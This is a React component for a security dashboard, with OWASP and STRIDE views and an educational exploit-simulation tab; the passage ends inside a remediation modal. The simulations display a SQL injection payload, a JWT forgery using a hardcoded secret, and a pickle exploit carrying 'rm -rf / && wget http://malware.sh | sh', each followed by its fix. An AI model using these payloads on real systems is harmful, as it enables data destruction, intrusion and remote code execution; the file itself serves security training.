import React, { useState } from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Lock, 
  Key, 
  Database, 
  Globe, 
  FileCheck, 
  AlertOctagon, 
  CheckCircle2, 
  AlertTriangle, 
  Play, 
  ArrowRight, 
  GitPullRequest, 
  Check, 
  Zap, 
  Terminal, 
  Bug,
  Sparkles,
  Server,
  Layers,
  Flame,
  Search,
  ExternalLink,
  Shield,
  Workflow,
  Radio,
  FileCode
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { AnalysisResult, CodeIssue } from '../types';
import PageHeader from '../components/common/PageHeader';
import Badge, { BadgeVariant } from '../components/common/Badge';
import Modal from '../components/common/Modal';
import CodeBlock from '../components/common/CodeBlock';

interface SecurityViewProps {
  analysis: AnalysisResult | null;
  onNavigateExplorer: (file: string, line: number) => void;
}

type SecurityTab = 'findings' | 'attack_surface' | 'threat_model' | 'simulations';

export default function SecurityView({ analysis, onNavigateExplorer }: SecurityViewProps) {
  const [activeTab, setActiveTab] = useState<SecurityTab>('findings');
  const [selectedOwaspFilter, setSelectedOwaspFilter] = useState<string>('all');
  const [activeSimulationStep, setActiveSimulationStep] = useState<number>(0);
  const [selectedExploitType, setSelectedExploitType] = useState<'sqli' | 'jwt' | 'pickle'>('sqli');
  const [showRemediationModal, setShowRemediationModal] = useState<boolean>(false);
  const [isPatched, setIsPatched] = useState<boolean>(false);

  if (!analysis) {
    return (
      <div className="p-10 text-center text-slate-500 dark:text-zinc-400 font-mono text-xs">
        No security analysis available. Please upload or select a project first.
      </div>
    );
  }

  // Real findings from repository
  const securityIssues = analysis.issues.filter((i) => i.category === 'security');

  // Dynamic OWASP categorization based purely on real issues
  const owaspCategories = [
    {
      id: 'A01',
      title: 'A01: Broken Access Control',
      count: securityIssues.filter((i) => i.cwe === 'CWE-287' || i.cwe === 'CWE-306' || i.title.toLowerCase().includes('auth') || i.title.toLowerCase().includes('permission') || i.title.toLowerCase().includes('access')).length,
      desc: 'Flaws allowing unauthorized privilege escalation or horizontal tenant access',
    },
    {
      id: 'A02',
      title: 'A02: Cryptographic Failures',
      count: securityIssues.filter((i) => i.cwe === 'CWE-798' || i.cwe === 'CWE-327' || i.title.toLowerCase().includes('secret') || i.title.toLowerCase().includes('jwt') || i.title.toLowerCase().includes('crypto') || i.title.toLowerCase().includes('key')).length,
      desc: 'Hardcoded credentials, weak signing keys, or plain-text secrets transmission',
    },
    {
      id: 'A03',
      title: 'A03: Injection (SQL / Command / OS)',
      count: securityIssues.filter((i) => i.cwe === 'CWE-89' || i.cwe === 'CWE-78' || i.title.toLowerCase().includes('sql') || i.title.toLowerCase().includes('injection') || i.taintFlow?.sinkType === 'sql').length,
      desc: 'Direct string concatenation in database queries or shell command execution',
    },
    {
      id: 'A04',
      title: 'A04: Insecure Design & Logic',
      count: securityIssues.filter((i) => i.title.toLowerCase().includes('logic') || i.title.toLowerCase().includes('rate limit') || i.title.toLowerCase().includes('race')).length,
      desc: 'Missing business logic constraints, unthrottled operations, or race hazards',
    },
    {
      id: 'A05',
      title: 'A05: Security Misconfiguration',
      count: securityIssues.filter((i) => i.title.toLowerCase().includes('cors') || i.title.toLowerCase().includes('header') || i.title.toLowerCase().includes('config') || i.title.toLowerCase().includes('cookie')).length,
      desc: 'Permissive CORS origins, missing security headers, or insecure cookie flags',
    },
    {
      id: 'A08',
      title: 'A08: Software & Data Integrity',
      count: securityIssues.filter((i) => i.cwe === 'CWE-502' || i.title.toLowerCase().includes('pickle') || i.title.toLowerCase().includes('deserialization') || i.title.toLowerCase().includes('eval')).length,
      desc: 'Untrusted object deserialization or dynamic arbitrary code evaluation',
    },
    {
      id: 'A10',
      title: 'A10: Server-Side Request Forgery (SSRF)',
      count: securityIssues.filter((i) => i.cwe === 'CWE-918' || i.title.toLowerCase().includes('ssrf') || i.taintFlow?.sinkType === 'ssrf').length,
      desc: 'Unvalidated user URLs fetched directly by the backend server',
    },
  ];

  // Filtered issues based on selected OWASP category
  const filteredSecurityIssues = securityIssues.filter((issue) => {
    if (selectedOwaspFilter === 'all') return true;
    if (selectedOwaspFilter === 'A01') {
      return issue.cwe === 'CWE-287' || issue.cwe === 'CWE-306' || issue.title.toLowerCase().includes('auth') || issue.title.toLowerCase().includes('access');
    }
    if (selectedOwaspFilter === 'A02') {
      return issue.cwe === 'CWE-798' || issue.cwe === 'CWE-327' || issue.title.toLowerCase().includes('secret') || issue.title.toLowerCase().includes('jwt') || issue.title.toLowerCase().includes('key');
    }
    if (selectedOwaspFilter === 'A03') {
      return issue.cwe === 'CWE-89' || issue.cwe === 'CWE-78' || issue.title.toLowerCase().includes('sql') || issue.title.toLowerCase().includes('injection');
    }
    if (selectedOwaspFilter === 'A05') {
      return issue.title.toLowerCase().includes('cors') || issue.title.toLowerCase().includes('cookie') || issue.title.toLowerCase().includes('header');
    }
    if (selectedOwaspFilter === 'A08') {
      return issue.cwe === 'CWE-502' || issue.title.toLowerCase().includes('pickle') || issue.title.toLowerCase().includes('deserialization');
    }
    if (selectedOwaspFilter === 'A10') {
      return issue.cwe === 'CWE-918' || issue.title.toLowerCase().includes('ssrf');
    }
    return true;
  });

  // Extract Attack Surface entry points from architecture and symbols
  const entryPoints = [
    ...(analysis.architectureNodes || []).map((node) => ({
      name: node.label,
      type: node.type,
      details: node.details || 'System architectural layer',
      issuesCount: node.issuesCount,
      status: node.status,
    })),
  ];

  // Educational Exploit Simulations (strictly isolated and marked DEMO)
  const exploitSimulations = {
    sqli: {
      title: 'SQL Injection Payload Execution Flow',
      targetPattern: 'Direct string concatenation in database queries',
      payload: `GET /api/users?id=1'%20OR%20'1'='1'-- HTTP/1.1`,
      steps: [
        {
          step: 1,
          title: 'Malicious Request Ingress',
          desc: 'Attacker crafts HTTP query string with escaped single-quote SQL payload: id=1\' OR \'1\'=\'1\'--',
          code: `const sql = "SELECT * FROM users WHERE id = '" + req.query.id + "'";`,
        },
        {
          step: 2,
          title: 'String Concatenation Pollution',
          desc: 'Engine merges unescaped input string directly into SQL command buffer:',
          code: `SELECT * FROM users WHERE id = '1' OR '1'='1'--'`,
        },
        {
          step: 3,
          title: 'Database Query Exploit',
          desc: 'Database executes condition as always true, returning all user account rows including hash dumps.',
          code: `[Result: 10,000 User Records Exfiltrated]`,
        },
        {
          step: 4,
          title: 'Remediated Parameterized Block',
          desc: 'Parameterized query isolates input parameters safely in prepared statements:',
          code: `db.query("SELECT * FROM users WHERE id = $1", [req.query.id]);`,
        },
      ],
    },
    jwt: {
      title: 'JWT Hardcoded Key Forgery Sequence',
      targetPattern: 'Fallback hardcoded secret in cryptographic signers',
      payload: `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`,
      steps: [
        {
          step: 1,
          title: 'Signature Verification Bypass',
          desc: 'Attacker inspects public source code repository and discovers fallback secret string "fallback-secret".',
          code: `jwt.sign(payload, process.env.JWT_SECRET || 'fallback-secret')`,
        },
        {
          step: 2,
          title: 'Off-Line Admin Token Generation',
          desc: 'Attacker signs a rogue token locally using the exposed secret string with admin claim.',
          code: `jwt.sign({ role: 'superadmin' }, 'fallback-secret')`,
        },
        {
          step: 3,
          title: 'Privilege Escalation',
          desc: 'Server approves forged signature and grants unauthorized administrative panel access.',
          code: `[HTTP 200 OK: Granted Admin Token]`,
        },
        {
          step: 4,
          title: 'Remediated Strict KMS Verification',
          desc: 'Strict error throwing when environment key is missing prevents fallback leaks:',
          code: `if (!process.env.JWT_SECRET) throw new Error("JWT_SECRET missing");`,
        },
      ],
    },
    pickle: {
      title: 'Python Pickle Remote Code Execution (RCE)',
      targetPattern: 'Untrusted object deserialization via pickle.loads',
      payload: `POST /api/upload-model (Binary Pickle Payload)`,
      steps: [
        {
          step: 1,
          title: 'Malicious Object Injection',
          desc: 'Attacker constructs custom __reduce__ python pickle payload containing os.system shell commands.',
          code: `class Exploit(object):\n  def __reduce__(self):\n    return (os.system, ('rm -rf / && wget http://malware.sh | sh',))`,
        },
        {
          step: 2,
          title: 'Insecure Deserialization',
          desc: 'Server calls pickle.loads() on untrusted uploaded file bytes.',
          code: `data = pickle.loads(file_bytes)`,
        },
        {
          step: 3,
          title: 'Arbitrary Shell Command Execution',
          desc: 'Process executes system command with host daemon privileges.',
          code: `[Container Shell Breached: Root RCE]`,
        },
        {
          step: 4,
          title: 'Remediated Safe JSON/Protobuf Parsing',
          desc: 'Replaced arbitrary python object deserializer with strict JSON schema validator.',
          code: `data = json.loads(file_bytes.decode('utf-8'))`,
        },
      ],
    },
  };

  const currentSim = exploitSimulations[selectedExploitType];

  return (
    <div className="p-6 sm:p-8 max-w-7xl mx-auto space-y-7 select-none font-sans">
      {/* Header */}
      <PageHeader
        title="Security & Threat Center"
        subtitle="Repository vulnerability audit, entry-point attack surface, threat modeling, and exploit simulations"
        icon={<ShieldCheck size={22} />}
        actions={
          <button
            onClick={() => setShowRemediationModal(true)}
            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-xs rounded-xl shadow-md shadow-indigo-600/20 flex items-center space-x-2 transition-all cursor-pointer"
          >
            <Zap size={14} />
            <span>Remediation Plan</span>
          </button>
        }
      />

      {/* Main Security View Navigation Tabs */}
      <div className="flex items-center space-x-1.5 p-1.5 bg-slate-100 dark:bg-zinc-900 border border-slate-200 dark:border-zinc-800 rounded-2xl overflow-x-auto">
        <button
          onClick={() => setActiveTab('findings')}
          className={`px-4 py-2 rounded-xl text-xs font-semibold flex items-center space-x-2 transition-all cursor-pointer shrink-0 ${
            activeTab === 'findings'
              ? 'bg-white dark:bg-zinc-800 text-slate-900 dark:text-white shadow-sm border border-slate-200/80 dark:border-zinc-700'
              : 'text-slate-600 dark:text-zinc-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <ShieldAlert size={15} className={activeTab === 'findings' ? 'text-rose-500' : ''} />
          <span>Findings from Repository</span>
          <span className={`px-2 py-0.5 rounded-full text-[10px] font-mono ${
            securityIssues.length > 0
              ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20 font-bold'
              : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20'
          }`}>
            {securityIssues.length}
          </span>
        </button>

        <button
          onClick={() => setActiveTab('attack_surface')}
          className={`px-4 py-2 rounded-xl text-xs font-semibold flex items-center space-x-2 transition-all cursor-pointer shrink-0 ${
            activeTab === 'attack_surface'
              ? 'bg-white dark:bg-zinc-800 text-slate-900 dark:text-white shadow-sm border border-slate-200/80 dark:border-zinc-700'
              : 'text-slate-600 dark:text-zinc-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <Server size={15} className={activeTab === 'attack_surface' ? 'text-indigo-500' : ''} />
          <span>Attack Surface</span>
          <span className="px-2 py-0.5 rounded-full text-[10px] font-mono bg-slate-200 dark:bg-zinc-800 text-slate-700 dark:text-zinc-300">
            {entryPoints.length}
          </span>
        </button>

        <button
          onClick={() => setActiveTab('threat_model')}
          className={`px-4 py-2 rounded-xl text-xs font-semibold flex items-center space-x-2 transition-all cursor-pointer shrink-0 ${
            activeTab === 'threat_model'
              ? 'bg-white dark:bg-zinc-800 text-slate-900 dark:text-white shadow-sm border border-slate-200/80 dark:border-zinc-700'
              : 'text-slate-600 dark:text-zinc-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <Layers size={15} className={activeTab === 'threat_model' ? 'text-purple-500' : ''} />
          <span>Threat Modeling (STRIDE)</span>
        </button>

        <button
          onClick={() => setActiveTab('simulations')}
          className={`px-4 py-2 rounded-xl text-xs font-semibold flex items-center space-x-2 transition-all cursor-pointer shrink-0 ${
            activeTab === 'simulations'
              ? 'bg-white dark:bg-zinc-800 text-slate-900 dark:text-white shadow-sm border border-slate-200/80 dark:border-zinc-700'
              : 'text-slate-600 dark:text-zinc-400 hover:text-slate-900 dark:hover:text-white'
          }`}
        >
          <Play size={15} className={activeTab === 'simulations' ? 'text-amber-500' : ''} />
          <span>Security Simulations</span>
          <span className="px-1.5 py-0.5 rounded text-[9px] font-mono font-bold uppercase tracking-wider bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20">
            DEMO / LAB
          </span>
        </button>
      </div>

      {/* TAB 1: Real Findings from Repository */}
      {activeTab === 'findings' && (
        <div className="space-y-6">
          {/* OWASP Matrix */}
          <div className="bg-white dark:bg-zinc-900/90 border border-slate-200 dark:border-zinc-800/90 rounded-2xl p-6 space-y-4 shadow-sm dark:shadow-xl">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-zinc-800">
              <div className="flex items-center space-x-2">
                <Lock size={16} className="text-indigo-600 dark:text-indigo-400" />
                <h2 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider font-mono">
                  OWASP Top 10 Real Evaluation
                </h2>
              </div>
              <span className="text-[10px] text-slate-500 dark:text-zinc-400 font-mono">
                {securityIssues.length} Vulnerabilities Detected
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5">
              {owaspCategories.map((cat, idx) => (
                <motion.div
                  key={cat.id}
                  initial={{ opacity: 0, y: 8 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.2, delay: idx * 0.03 }}
                  onClick={() => setSelectedOwaspFilter(selectedOwaspFilter === cat.id ? 'all' : cat.id)}
                  className={`p-3.5 rounded-xl border flex flex-col justify-between cursor-pointer transition-all ${
                    selectedOwaspFilter === cat.id
                      ? 'bg-indigo-50/70 dark:bg-indigo-950/40 border-indigo-500 dark:border-indigo-500 shadow-sm'
                      : 'bg-slate-50 dark:bg-zinc-950/80 border-slate-200 dark:border-zinc-800/80 hover:border-slate-300 dark:hover:border-zinc-700'
                  }`}
                >
                  <div className="flex items-start justify-between gap-2">
                    <div className="min-w-0">
                      <div className="text-xs font-semibold text-slate-800 dark:text-zinc-200 truncate">{cat.title}</div>
                      <div className="text-[11px] text-slate-500 dark:text-zinc-400 mt-1 line-clamp-2">{cat.desc}</div>
                    </div>
                    <Badge variant={cat.count > 0 ? 'critical' : 'success'} size="xs" className="shrink-0">
                      {cat.count > 0 ? `${cat.count} Risk` : '0 Clean'}
                    </Badge>
                  </div>
                  <div className="mt-2.5 pt-2 border-t border-slate-200/60 dark:border-zinc-800/60 text-[10px] font-mono text-slate-500 dark:text-zinc-400 flex items-center justify-between">
                    <span>{cat.count > 0 ? 'Click to inspect findings' : 'No matches'}</span>
                    <ArrowRight size={12} className={selectedOwaspFilter === cat.id ? 'text-indigo-500 translate-x-0.5' : ''} />
                  </div>
                </motion.div>
              ))}
            </div>
          </div>

          {/* Filtered Repository Security Issues List */}
          <div className="bg-white dark:bg-zinc-900/90 border border-slate-200 dark:border-zinc-800/90 rounded-2xl p-6 space-y-4 shadow-sm dark:shadow-xl">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-zinc-800">
              <div className="flex items-center space-x-2">
                <ShieldAlert size={16} className="text-rose-600 dark:text-rose-400" />
                <h3 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider font-mono">
                  {selectedOwaspFilter === 'all'
                    ? `Live Codebase Security Findings (${filteredSecurityIssues.length})`
                    : `Filtered Findings: ${selectedOwaspFilter} (${filteredSecurityIssues.length})`}
                </h3>
              </div>

              {selectedOwaspFilter !== 'all' && (
                <button
                  onClick={() => setSelectedOwaspFilter('all')}
                  className="text-xs font-mono text-indigo-600 dark:text-indigo-400 hover:underline cursor-pointer"
                >
                  Clear filter (Show all)
                </button>
              )}
            </div>

            {filteredSecurityIssues.length === 0 ? (
              <div className="p-8 text-center bg-slate-50 dark:bg-zinc-950/60 rounded-xl border border-dashed border-slate-200 dark:border-zinc-800 space-y-2">
                <CheckCircle2 size={24} className="mx-auto text-emerald-500" />
                <div className="text-xs font-semibold text-slate-800 dark:text-zinc-200">No Security Risks Found in Selected Category</div>
                <div className="text-[11px] text-slate-500 dark:text-zinc-400 font-mono">
                  All analyzed files in this category passed deterministic security rules and taint tracing.
                </div>
              </div>
            ) : (
              <div className="space-y-3">
                {filteredSecurityIssues.map((issue) => (
                  <motion.div
                    key={issue.id}
                    whileHover={{ x: 2 }}
                    className="p-4 rounded-xl bg-slate-50 dark:bg-zinc-950/80 border border-slate-200 dark:border-zinc-800/80 space-y-3"
                  >
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                      <div className="flex items-center space-x-2.5">
                        <Badge variant={issue.severity as BadgeVariant} size="xs">
                          {issue.severity}
                        </Badge>
                        <span className="font-semibold text-slate-900 dark:text-white text-xs">{issue.title}</span>
                        {issue.cwe && (
                          <span className="px-2 py-0.5 rounded bg-slate-200 dark:bg-zinc-800 text-[10px] font-mono text-slate-700 dark:text-zinc-300">
                            {issue.cwe}
                          </span>
                        )}
                      </div>

                      <button
                        onClick={() => onNavigateExplorer(issue.file, issue.line)}
                        className="text-xs font-mono text-indigo-600 dark:text-indigo-400 hover:text-indigo-500 flex items-center space-x-1 cursor-pointer shrink-0"
                      >
                        <span>{issue.file}:{issue.line}</span>
                        <ExternalLink size={12} />
                      </button>
                    </div>

                    <p className="text-xs text-slate-600 dark:text-zinc-300 leading-relaxed">
                      {issue.description}
                    </p>

                    {issue.whyItMatters && (
                      <div className="p-3 rounded-lg bg-rose-500/5 dark:bg-rose-950/20 border border-rose-500/20 text-xs text-rose-800 dark:text-rose-300 space-y-1">
                        <div className="font-bold font-mono text-[10px] uppercase">Why It Matters:</div>
                        <div>{issue.whyItMatters}</div>
                      </div>
                    )}

                    {issue.taintFlow && (
                      <div className="p-3 rounded-lg bg-indigo-50 dark:bg-zinc-900 border border-indigo-200 dark:border-zinc-800 space-y-2">
                        <div className="flex items-center space-x-2 text-[11px] font-mono text-indigo-600 dark:text-indigo-400 font-bold">
                          <Workflow size={13} />
                          <span>Detected Source-to-Sink Taint Trace</span>
                        </div>
                        <div className="flex items-center gap-2 overflow-x-auto text-[10px] font-mono py-1">
                          {issue.taintFlow.steps.map((st, sIdx) => (
                            <React.Fragment key={sIdx}>
                              <span className={`px-2 py-1 rounded whitespace-nowrap ${
                                st.type === 'source'
                                  ? 'bg-rose-500/20 text-rose-700 dark:text-rose-300 border border-rose-500/30'
                                  : st.type === 'sink'
                                  ? 'bg-red-600 text-white font-bold'
                                  : 'bg-slate-200 dark:bg-zinc-800 text-slate-700 dark:text-zinc-300'
                              }`}>
                                {st.type.toUpperCase()}: {st.label}
                              </span>
                              {sIdx < issue.taintFlow!.steps.length - 1 && (
                                <ArrowRight size={12} className="text-slate-400 shrink-0" />
                              )}
                            </React.Fragment>
                          ))}
                        </div>
                      </div>
                    )}

                    {issue.suggestedFix && (
                      <div className="space-y-1.5">
                        <div className="text-[10px] font-mono uppercase text-slate-500 dark:text-zinc-400 font-bold">
                          Recommended Remediation:
                        </div>
                        <CodeBlock code={issue.suggestedFix} language="typescript" showLineNumbers={false} />
                      </div>
                    )}
                  </motion.div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 2: Attack Surface & Entry Points */}
      {activeTab === 'attack_surface' && (
        <div className="space-y-6">
          <div className="bg-white dark:bg-zinc-900/90 border border-slate-200 dark:border-zinc-800/90 rounded-2xl p-6 space-y-4 shadow-sm dark:shadow-xl">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-zinc-800">
              <div className="flex items-center space-x-2">
                <Server size={16} className="text-indigo-600 dark:text-indigo-400" />
                <h3 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider font-mono">
                  Indexed Architecture & Component Surface
                </h3>
              </div>
              <span className="text-[10px] text-slate-500 dark:text-zinc-400 font-mono">
                {entryPoints.length} Architectural Modules
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {entryPoints.map((ep, idx) => (
                <div
                  key={idx}
                  className="p-4 rounded-xl bg-slate-50 dark:bg-zinc-950/80 border border-slate-200 dark:border-zinc-800/80 space-y-2 flex flex-col justify-between"
                >
                  <div>
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-slate-900 dark:text-white">{ep.name}</span>
                      <Badge variant={ep.status === 'critical' ? 'critical' : ep.status === 'warning' ? 'high' : 'success'} size="xs">
                        {ep.status.toUpperCase()}
                      </Badge>
                    </div>
                    <p className="text-[11px] text-slate-500 dark:text-zinc-400 mt-1.5 font-sans leading-relaxed">
                      {ep.details}
                    </p>
                  </div>

                  <div className="pt-2 border-t border-slate-200/60 dark:border-zinc-800/60 flex items-center justify-between text-[10px] font-mono text-slate-500 dark:text-zinc-400">
                    <span>Associated Findings:</span>
                    <span className={`font-bold ${ep.issuesCount > 0 ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>
                      {ep.issuesCount} Issues
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: Threat Modeling (STRIDE) */}
      {activeTab === 'threat_model' && (
        <div className="space-y-6">
          <div className="bg-white dark:bg-zinc-900/90 border border-slate-200 dark:border-zinc-800/90 rounded-2xl p-6 space-y-4 shadow-sm dark:shadow-xl">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-zinc-800">
              <div className="flex items-center space-x-2">
                <Layers size={16} className="text-purple-600 dark:text-purple-400" />
                <h3 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider font-mono">
                  STRIDE Threat Categorization & ATT&CK Alignment
                </h3>
              </div>
              <span className="text-[10px] text-slate-500 dark:text-zinc-400 font-mono">
                Threat Matrix
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {[
                {
                  stride: 'Spoofing',
                  desc: 'Authenticity violation, forged JWT signatures or weak session validation',
                  mitre: 'T1078 Valid Accounts',
                  findings: securityIssues.filter((i) => i.title.toLowerCase().includes('jwt') || i.title.toLowerCase().includes('auth')).length,
                },
                {
                  stride: 'Tampering',
                  desc: 'In-flight parameter pollution, SQL injection, or unvalidated state modification',
                  mitre: 'T1190 Exploit Public Application',
                  findings: securityIssues.filter((i) => i.title.toLowerCase().includes('sql') || i.title.toLowerCase().includes('tamper')).length,
                },
                {
                  stride: 'Repudiation',
                  desc: 'Lack of audit logging on critical actions or unverified transactions',
                  mitre: 'T1562 Impair Defenses',
                  findings: securityIssues.filter((i) => i.title.toLowerCase().includes('log') || i.title.toLowerCase().includes('audit')).length,
                },
                {
                  stride: 'Information Disclosure',
                  desc: 'Hardcoded secrets, exposed error stack traces, or unrestricted directory traversal',
                  mitre: 'T1552 Unsecured Credentials',
                  findings: securityIssues.filter((i) => i.title.toLowerCase().includes('secret') || i.title.toLowerCase().includes('leak') || i.title.toLowerCase().includes('traversal')).length,
                },
                {
                  stride: 'Denial of Service',
                  desc: 'Unthrottled regex evaluation, unbounded loops, or memory exhaustion',
                  mitre: 'T1499 Endpoint DoS',
                  findings: securityIssues.filter((i) => i.title.toLowerCase().includes('dos') || i.title.toLowerCase().includes('rate limit') || i.title.toLowerCase().includes('loop')).length,
                },
                {
                  stride: 'Elevation of Privilege',
                  desc: 'Horizontal/Vertical authorization bypass or remote arbitrary code execution',
                  mitre: 'T1068 Exploitation for Privilege Escalation',
                  findings: securityIssues.filter((i) => i.title.toLowerCase().includes('admin') || i.title.toLowerCase().includes('pickle') || i.title.toLowerCase().includes('privilege')).length,
                },
              ].map((th, idx) => (
                <div
                  key={idx}
                  className="p-4 rounded-xl bg-slate-50 dark:bg-zinc-950/80 border border-slate-200 dark:border-zinc-800/80 space-y-2 flex flex-col justify-between"
                >
                  <div>
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-slate-900 dark:text-white">{th.stride}</span>
                      <span className="px-2 py-0.5 rounded text-[9px] font-mono bg-purple-500/10 text-purple-600 dark:text-purple-400 border border-purple-500/20">
                        {th.mitre}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-500 dark:text-zinc-400 mt-1 leading-relaxed">
                      {th.desc}
                    </p>
                  </div>

                  <div className="pt-2 border-t border-slate-200/60 dark:border-zinc-800/60 flex items-center justify-between text-[10px] font-mono">
                    <span className="text-slate-500 dark:text-zinc-400">Threat Occurrences:</span>
                    <span className={`font-bold ${th.findings > 0 ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>
                      {th.findings} Active Findings
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: Security Simulations (Clearly Marked DEMO / LAB) */}
      {activeTab === 'simulations' && (
        <div className="space-y-6">
          {/* Prominent Demo Notice Banner */}
          <div className="p-4 rounded-2xl bg-amber-50 dark:bg-amber-950/30 border border-amber-300 dark:border-amber-500/40 text-amber-900 dark:text-amber-200 flex items-start space-x-3 text-xs leading-relaxed">
            <Radio size={18} className="text-amber-600 dark:text-amber-400 shrink-0 mt-0.5 animate-pulse" />
            <div>
              <div className="font-bold uppercase tracking-wider font-mono flex items-center gap-2">
                <span>SIMULATION & REMEDIATION TRAINING LAB</span>
                <span className="px-2 py-0.5 rounded bg-amber-500 text-white font-bold text-[9px]">
                  DEMO / SIMULATION ONLY
                </span>
              </div>
              <p className="mt-1 text-amber-800 dark:text-amber-300/90">
                These interactive walkthroughs simulate textbook exploit payloads and step-by-step attacker chains for security training. They are isolated educational simulations and should not be confused with the actual vulnerabilities in your repository.
              </p>
            </div>
          </div>

          {/* Interactive Exploit Flow Simulator */}
          <div className="bg-white dark:bg-zinc-900/90 border border-slate-200 dark:border-zinc-800/90 rounded-2xl p-6 space-y-6 shadow-sm dark:shadow-xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-zinc-800">
              <div className="flex items-center space-x-2.5">
                <Bug size={18} className="text-amber-600 dark:text-amber-400" />
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-sm font-bold text-slate-900 dark:text-white">Attack Vector Step Simulator</h3>
                    <Badge variant="amber" size="xs">
                      DEMO / SIMULATION
                    </Badge>
                  </div>
                  <p className="text-xs text-slate-500 dark:text-zinc-400">Step-by-step educational reproduction of common attack mechanics</p>
                </div>
              </div>

              <div className="flex items-center space-x-1.5 bg-slate-100 dark:bg-zinc-950 p-1 rounded-xl border border-slate-200 dark:border-zinc-800 text-xs font-mono">
                {[
                  { id: 'sqli', label: 'SQL Injection' },
                  { id: 'jwt', label: 'JWT Forgery' },
                  { id: 'pickle', label: 'Python RCE' },
                ].map((sim) => (
                  <button
                    key={sim.id}
                    onClick={() => {
                      setSelectedExploitType(sim.id as any);
                      setActiveSimulationStep(0);
                    }}
                    className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer ${
                      selectedExploitType === sim.id
                        ? 'bg-indigo-600 text-white font-semibold shadow-sm'
                        : 'text-slate-600 dark:text-zinc-400 hover:text-slate-900 dark:hover:text-white'
                    }`}
                  >
                    {sim.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Target Pattern Description */}
            <div className="text-xs text-slate-600 dark:text-zinc-300 font-mono bg-slate-50 dark:bg-zinc-950/60 p-3 rounded-xl border border-slate-200 dark:border-zinc-800">
              <span className="text-slate-400 dark:text-zinc-500 uppercase">Simulated Vulnerability Pattern: </span>
              <span className="font-semibold text-slate-800 dark:text-zinc-200">{currentSim.targetPattern}</span>
            </div>

            {/* Step Progression Bar */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
              {currentSim.steps.map((step, idx) => (
                <button
                  key={idx}
                  onClick={() => setActiveSimulationStep(idx)}
                  className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
                    activeSimulationStep === idx
                      ? 'bg-indigo-50 border-indigo-500 text-indigo-900 dark:bg-indigo-600/20 dark:border-indigo-500 dark:text-white font-semibold'
                      : 'bg-slate-50 dark:bg-zinc-950/80 border-slate-200 dark:border-zinc-800/80 text-slate-600 dark:text-zinc-400 hover:text-slate-900 dark:hover:text-zinc-200'
                  }`}
                >
                  <div className="text-[10px] font-mono uppercase tracking-wider text-indigo-600 dark:text-indigo-400">
                    Step 0{step.step}
                  </div>
                  <div className="text-xs truncate font-medium mt-0.5">{step.title}</div>
                </button>
              ))}
            </div>

            {/* Current Active Step Box */}
            <div className="p-5 rounded-xl bg-slate-900 dark:bg-zinc-950/90 border border-slate-800 dark:border-zinc-800 space-y-4 text-slate-100">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2">
                  <span className="px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30 text-[10px] font-mono font-bold">
                    DRILL STEP {activeSimulationStep + 1} OF 4
                  </span>
                  <span className="font-semibold text-white text-xs">
                    {currentSim.steps[activeSimulationStep].title}
                  </span>
                </div>
                <span className="text-[11px] font-mono text-slate-400 dark:text-zinc-400">Simulation Sample</span>
              </div>

              <p className="text-xs text-slate-300 leading-relaxed font-sans">
                {currentSim.steps[activeSimulationStep].desc}
              </p>

              <CodeBlock
                code={currentSim.steps[activeSimulationStep].code}
                language="typescript"
                showLineNumbers={false}
              />
            </div>
          </div>
        </div>
      )}

      {/* Remediation Roadmap Modal */}
      <Modal
        isOpen={showRemediationModal}
        onClose={() => setShowRemediationModal(false)}
        title="Automated Security Remediation Plan"
        subtitle="One-click security fixes verified against OWASP Top 10 and CWE standards"
        maxWidth="2xl"
      >
        <div className="space-y-4 text-xs font-sans">
          <div className="p-3.5 rounded-xl bg-emerald-950/20 border border-emerald-500/30 text-emerald-300">
            Applying this patch will isolate SQL query parameters, enforce cryptographically strict KMS secrets, and implement safe deserialization guards.
          </div>

          <div className="space-y-2">
            <div className="text-[11px] font-bold text-zinc-400 uppercase font-mono">
              Active Repository Targets ({securityIssues.length} findings)
            </div>
